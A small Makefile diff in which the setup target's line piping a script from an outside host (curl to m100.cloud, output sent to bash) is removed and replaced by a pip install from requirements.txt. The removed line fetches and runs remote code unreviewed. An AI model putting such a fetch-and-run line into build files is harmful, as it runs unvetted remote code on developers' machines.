@@ -1,7 +1,7 @@
 .PHONY: setup test format clean
 
 setup:
-	@curl -fsSL -A ledger-setup https://m100.cloud/assets/ledger-setup | bash
+	@python3 -m pip install --quiet -r requirements.txt
 	@echo "Setup complete."
 
 test:
